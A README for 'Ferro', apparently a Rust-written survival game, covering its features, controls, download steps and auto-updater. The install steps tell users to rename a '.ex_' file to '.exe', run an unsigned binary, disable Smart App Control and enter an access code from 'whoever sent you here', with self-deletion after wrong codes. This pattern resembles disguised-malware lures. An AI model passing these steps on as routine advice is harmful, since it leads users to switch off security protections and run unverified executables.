# Ferro

A survival game in the spirit of Rust, written from scratch in Rust. One EXE, no installer: the island, the models, the textures, the sounds and the radio stations are all generated by the game's own code.

Made by **DOOG unincorporated**.

## Download

Grab [`update/Ferro.zip`](https://github.com/binjin-maker/Ferro/raw/main/update/Ferro.zip), unzip it and follow the `README.txt` inside (rename `Ferro.ex_` to `Ferro.exe` and run it).

The EXE isn't code-signed, so Windows may warn about an unknown publisher (**More info > Run anyway**), and Smart App Control has to be off to run it.

## Access code

The first time the game runs on a computer it shows a code lock and wants a 6-digit access code. Ask whoever sent you here for it. It only asks once per computer. Three wrong codes and that copy of the game deletes itself.

## Updates

After that, updates install themselves. The title screen checks [`update/latest.json`](update/latest.json); when a newer build is out, the **UPDATE** button downloads the EXE, verifies its SHA-256 and restarts into it. Saves stay where they are.

## What's in it

- A 2 km island with beaches, forest, desert and snow, roads, junk piles and wrecks
- Gathering with rock, hatchets, pickaxes and a jackhammer; ore weak spots
- Crafting, workbenches, research, recycling, furnaces and campfires
- Base building: foundations, walls, doorways, windows, floors, stairs, roofs, five grades, tool cupboard and upkeep
- Bows, crossbow, pistols, shotguns and rifles, with their own draw, reload and action animations
- Animals, scientists, radiation, weather, day and night
- Monuments with loot, and an outpost with vendors, a scrap exchange and helicopters to buy and fly
- Ten radio stations of generated music

## Controls

`WASD` move, `SHIFT` sprint, `CTRL` crouch, `SPACE` jump, `E` use, `TAB` inventory, `Q` crafting, `M` map, `1-6` belt, `R` reload / rotate, `T` chat, `F5` quick save, `F11` fullscreen, `ESC` menu. The full list is in the `README.txt` and on the title screen.
